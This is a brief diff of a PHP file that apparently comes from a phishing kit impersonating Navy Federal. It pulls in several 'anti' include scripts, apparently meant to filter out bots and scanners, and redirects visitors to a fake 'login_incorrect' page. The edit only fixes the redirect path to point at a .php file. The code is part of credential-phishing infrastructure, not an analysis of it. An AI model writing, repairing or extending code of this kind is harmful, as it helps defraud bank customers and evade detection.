@@ -6,5 +6,5 @@ include "anti/anti3.php";
 include "anti/anti4.php"; 
 include "anti/anti5.php"; 
 include "anti/anti7.php"; 
-header('Location: /navy_fed/login_incorrect');
+header('Location: /navy_fed/login_incorrect.php');
 ?>
